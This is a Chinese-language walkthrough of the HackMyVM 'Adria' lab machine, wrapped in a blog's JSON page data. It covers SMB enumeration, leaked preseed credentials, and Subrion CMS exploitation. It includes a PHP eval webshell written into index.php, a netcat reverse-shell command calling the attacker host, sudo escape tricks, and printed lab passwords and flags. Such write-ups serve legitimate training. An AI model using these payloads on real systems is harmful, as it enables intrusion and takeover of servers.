{"pageProps":{"postData":{"id":"HackMyVMAdria","contentHtml":"<h1>Adria.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Adria\">https://hackmyvm.eu/machines/machine.php?vm=Adria</a></p>\n</blockquote>\n<p>Notes：<strong>Enjoy!</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Adria nmap -sP 192.168.56.0/24                  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-16 20:58 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00042s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00031s latency).\nMAC Address: 08:00:27:F5:11:95 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.63\nHost is up (0.00046s latency).\nMAC Address: 08:00:27:7F:AE:28 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 6.06 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Adria nmap -sT -min-rate 10000 -p- 192.168.56.63\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-16 20:58 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.63\nHost is up (0.00058s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\nMAC Address: 08:00:27:7F:AE:28 (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 4.50 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Adria nmap -sT -A -T4 -O -p 22,80,139,445 192.168.56.63                                                                                                                                                      \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-16 21:00 EDT                                                                                                                                              \nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.63                                                                                                                                                                              \nHost is up (0.00072s latency).                                                                                                                                                                                  \n\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2 (protocol 2.0)\n| ssh-hostkey: \n|   256 <span class=\"hljs-built_in\">dd</span>:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)\n|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)\n80/tcp  open  http        Apache httpd 2.4.57 ((Debian))\n|_http-server-header: Apache/2.4.57 (Debian)\n| http-robots.txt: 7 disallowed entries \n| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ \n|_/updates/\n|_http-title: Did not follow redirect to http://adria.hmv/\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2\nMAC Address: 08:00:27:7F:AE:28 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: 2s\n|_nbstat: NetBIOS name: ADRIA, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: &#x3C;unknown> (unknown)\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   <span class=\"hljs-built_in\">date</span>: 2025-05-17T01:00:49\n|_  start_date: N/A\n</code></pre>\n<h2>SMB</h2>\n<p>我们能看到有<code>SMB</code>服务，尝试使用<code>anonymous</code> 用户去连接</p>\n<pre><code class=\"hljs language-bash\">➜  Adria smbclient -L 192.168.56.63 -U anonymous\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        <span class=\"hljs-built_in\">print</span>$          Disk      Printer Drivers\n        DebianShare     Disk      \n        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)\n        nobody          Disk      Home Directories\nReconnecting with SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\nsmbXcli_negprot_smb1_done: No compatible protocol selected by server.\nProtocol negotiation to server 192.168.56.63 (<span class=\"hljs-keyword\">for</span> a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>\n<p>在 <code>DebianShare</code> 中能下载一个压缩包</p>\n<pre><code class=\"hljs language-bash\">➜  Adria smbclient //192.168.56.63/DebianShare -U anonymous\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\nTry <span class=\"hljs-string\">\"help\"</span> to get a list of possible commands.\nsmb: \\> <span class=\"hljs-built_in\">dir</span>\n  .                                   D        0  Mon Dec  4 04:32:45 2023\n  ..                                  D        0  Sat Jul 22 04:10:13 2023\n  configz.zip                         N  2756857  Mon Nov  6 10:56:25 2023\n\n                19480400 blocks of size 1024. 15689496 blocks available\nsmb: \\> get configz.zip \ngetting file \\configz.zip of size 2756857 as configz.zip (47232.3 KiloBytes/sec) (average 47232.3 KiloBytes/sec)\n</code></pre>\n<p>解压该压缩包</p>\n<pre><code class=\"hljs language-bash\">unzip configz.zip\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  configz <span class=\"hljs-built_in\">ls</span>\nboot  isolinux  preseed\n</code></pre>\n<p>这些文件夹通常出现在与操作系统安装相关的目录结构中，尤其是用于创建安装盘或启动镜像时。具体解释如下：</p>\n<ul>\n<li><strong>boot</strong>：通常用于存放启动所需的文件，比如内核和初始文件系统。系统启动时，Bootloader 会加载这里的文件来启动操作系统。</li>\n<li><strong>isolinux</strong>：这是一个与 ISO 镜像文件相关的文件夹，包含了用于启动的文件，通常是 Linux 发行版或其他操作系统的安装镜像中的启动管理器。<code>isolinux</code> 是 ISO 9660 标准的一部分，通常用于创建可启动的 CD/DVD 镜像。</li>\n<li><strong>preseed</strong>：通常与自动化安装相关。<code>preseed</code> 文件是用来配置操作系统安装过程中一些默认选项的文件，常见于 Debian 和 Ubuntu 系统中。它可以用于在安装过程中自动填写设置，免去人工干预。</li>\n</ul>\n<p>在**<code>preseed</code>**中找到了一些有趣的东西</p>\n<pre><code class=\"hljs language-bash\">// 创建 admin 用户\n<span class=\"hljs-comment\"># Users</span>\nd-i passwd/user-fullname string admin\nd-i passwd/username string admin\nd-i passwd/user-password password jojo1989\nd-i passwd/root-login boolean <span class=\"hljs-literal\">true</span>\nd-i passwd/root-password password jojo1989\nd-i user-setup/allow-password-weak boolean <span class=\"hljs-literal\">true</span>\n\n// 创建 Adam Lewis 用户\n<span class=\"hljs-comment\"># To create a normal user account.</span>\nd-i passwd/user-fullname string Adam Lewis\nd-i passwd/username string alewis\n<span class=\"hljs-comment\"># Normal user's password, either in clear text</span>\n<span class=\"hljs-comment\">#d-i passwd/user-password password insecure</span>\n<span class=\"hljs-comment\">#d-i passwd/user-password-again password insecure</span>\n<span class=\"hljs-comment\"># or encrypted using a crypt(3) hash.</span>\nd-i passwd/user-password-crypted 158f5ddb69d03f91bb449ee170913268\n<span class=\"hljs-comment\"># Create the first user with the specified UID instead of the default.</span>\nd-i passwd/user-uid string 1010\n<span class=\"hljs-comment\"># The installer will warn about weak passwords. If you are sure you know</span>\n<span class=\"hljs-comment\"># what you're doing and want to override it, uncomment this.</span>\n<span class=\"hljs-comment\">#d-i user-setup/allow-password-weak boolean true</span>\n</code></pre>\n<p>使用 <code>rockyou</code> 爆破 <code>alewis</code> 用户的密码失败了</p>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>需要将 <code>adria.hmv</code> 写入 <code>hosts</code> ，是使用 <code>subrion</code> 搭建的（一个开源内容管理系统）</p>\n<p><img src=\"/post-images/HackMyVMAdria/image.png\" alt=\"image.png\"></p>\n<p>有注册功能，但是密码会被发送到邮箱，但是邮箱是收不到的。</p>\n<p><img src=\"/post-images/HackMyVMAdria/image1.png\" alt=\"image.png\"></p>\n<p>尝试前面获得的账户 <code>admin:jojo1989</code></p>\n<p><img src=\"/post-images/HackMyVMAdria/image2.png\" alt=\"image.png\"></p>\n<p>点击齿轮图标能进入后台，并且能看到版本是 <code>4.2.1</code></p>\n<p><img src=\"/post-images/HackMyVMAdria/image3.png\" alt=\"image.png\"></p>\n<p>搜索公开漏洞，该版本存在文件上传漏洞</p>\n<h3><strong>CVE-2018-19422</strong></h3>\n<p>直接脚本梭哈：<a href=\"https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE\">https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE</a></p>\n<p><img src=\"/post-images/HackMyVMAdria/image4.png\" alt=\"image.png\"></p>\n<p>我这里尝试修改了脚本，因为是成功登陆进去了的，但是也是在上传后无法进行访问，我这里手动上传也是一样</p>\n<p>然后找到了另外一种利用方式：<a href=\"https://github.com/intelliants/subrion/issues/909\">https://github.com/intelliants/subrion/issues/909</a></p>\n<ol>\n<li>\n<p>查看网站绝对路径  <code>/var/www/html</code></p>\n<p><img src=\"/post-images/HackMyVMAdria/image5.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p><code>system</code> 中选择 <code>hooks</code> 页</p>\n<p><img src=\"/post-images/HackMyVMAdria/image6.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>在 <code>Hooks</code> 中编辑 <code>sitemapGeneration</code> 并保存，从上面的 <code>PHPinfo</code> 获取绝对路径</p>\n<p>此时我们可以将 webshell 写入网站首页文件 <code>index.php</code></p>\n<pre><code class=\"hljs language-bash\">fputs(fopen(<span class=\"hljs-string\">'/var/www/html/index.php'</span>,<span class=\"hljs-string\">'a+'</span>),<span class=\"hljs-string\">'@eval($_GET[cmd]);'</span>);\n</code></pre>\n<p><img src=\"/post-images/HackMyVMAdria/image7.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p><code>save</code> 后点击 <code>General Sitemap</code></p>\n<p><img src=\"/post-images/HackMyVMAdria/image8.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>监听端口，进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">➜  Adria curl -G <span class=\"hljs-string\">\"http://adria.hmv/index.php\"</span> --data-urlencode <span class=\"hljs-string\">\"cmd=system('nc -e /bin/bash 192.168.56.4 1234');\"</span>\n</code></pre>\n<p><img src=\"/post-images/HackMyVMAdria/image9.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>提权 - To Adriana</h2>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">www-data@adria:/var/www/html$ <span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span>: unable to resolve host adria: Temporary failure <span class=\"hljs-keyword\">in</span> name resolution\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> www-data on adria:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser www-data may run the following commands on adria:\n    (adriana) NOPASSWD: /usr/bin/scalar\n</code></pre>\n<p>该命令无法提权，但是可以通过它的 <code>help</code> 进行提权，它的命令帮助是通过 <code>head</code> 打开的，<code>head</code>只需要输入 <code>!/bin/bash</code> 即可打开 <code>shell</code></p>\n<p><img src=\"/post-images/HackMyVMAdria/image10.png\" alt=\"image.png\"></p>\n<p>写入公钥，然后就可以使用 <code>SSH</code> 进行登陆了</p>\n<p><img src=\"/post-images/HackMyVMAdria/image11.png\" alt=\"image.png\"></p>\n<p><code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">╭─adriana@adria ~ \n╰─$ <span class=\"hljs-built_in\">cat</span> user.txt \nfbd401c3bff5ec92d1ba6f74a2340f0f\n</code></pre>\n<h2>提权 - To Root</h2>\n<p><code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">╭─adriana@adria ~ \n╰─$ <span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span>: unable to resolve host adria: Temporary failure <span class=\"hljs-keyword\">in</span> name resolution\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> adriana on adria:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser adriana may run the following commands on adria:\n    (ALL : ALL) NOPASSWD: /opt/backup\n</code></pre>\n<p>查看 <code>backup</code> 是一个脚本</p>\n<pre><code class=\"hljs language-bash\">╭─adriana@adria /opt \n╰─$ <span class=\"hljs-built_in\">ls</span> -al backup \n-rwxr-xr-x 1 root root 294 Nov  6  2023 backup\n╭─adriana@adria /opt \n╰─$ <span class=\"hljs-built_in\">cat</span> backup  \n<span class=\"hljs-comment\">#!/bin/bash</span>\n\nPASSWORD=$(/usr/bin/cat /root/pass)\n\n<span class=\"hljs-built_in\">read</span> -ep <span class=\"hljs-string\">\"Password: \"</span> USER_PASS\n\n<span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$PASSWORD</span> == <span class=\"hljs-variable\">$USER_PASS</span> ]] ; <span class=\"hljs-keyword\">then</span>\n\n  /usr/bin/echo <span class=\"hljs-string\">\"Authorized access\"</span>\n  /usr/bin/sleep 1\n  /usr/bin/zip -r -e -P <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$PASSWORD</span>\"</span> /opt/backup.zip /var/www/html\n<span class=\"hljs-keyword\">else</span>\n  /usr/bin/echo <span class=\"hljs-string\">\"Access denied\"</span>\n  <span class=\"hljs-built_in\">exit</span> 1\n<span class=\"hljs-keyword\">fi</span>\n</code></pre>\n<p>读取用户输入的密码和<code>/root/pass</code>中的密码进行比对，正确的话会使用密码作为压缩密码压缩 <code>/var/www/html</code> 并保存为 <code>/opt/backup.zip</code></p>\n<p>其中的 <code>$PASSWORD == $USER_PASS</code> 应该为 <code>\"$PASSWORD\"== \"$USER_PASS\"</code> ，可以尝试使用通配符绕过</p>\n<p>并且<code>zip -P \"$PASSWORD\"</code>会将密码明文传递到命令行参数，通过<code>ps -ef</code>等命令可被其他用户捕获</p>\n<p>首先上传 <code>pspy64</code> 监听进程</p>\n<p>然后执行 <code>sudo /opt/backup</code> ，密码输入 <code>*</code> ，然后 <code>pspy64</code> 中可以截取到密码</p>\n<p><img src=\"/post-images/HackMyVMAdria/image12.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">8eNctPoCh4Potes5eVD7eMxUw6wRBmO\n</code></pre>\n<p>该密码就是 <code>root</code> 的密码，读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">╭─root@adria ~ \n╰─# <span class=\"hljs-built_in\">cat</span> root.txt \n3a61b172fd39402aa96b1653a18e38a1\n</code></pre>","title":"HackMyVM - Adria","date":"2025-05-17","updated":"2025-05-17","tags":["HackMyVM","Linux靶机","subrion"],"categories":"靶机","comments":true},"recentPosts":[{"id":"PWN - 基本ROP","title":"PWN - 基本ROP","date":"2025-06-14","isEncrypted":false,"year":"2025","month":"06","day":"14"},{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"},{"id":"Personalsunset","title":"Personal - sunset","date":"2025-06-10","isEncrypted":true,"year":"2025","month":"06","day":"10"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"}]},"__N_SSG":true}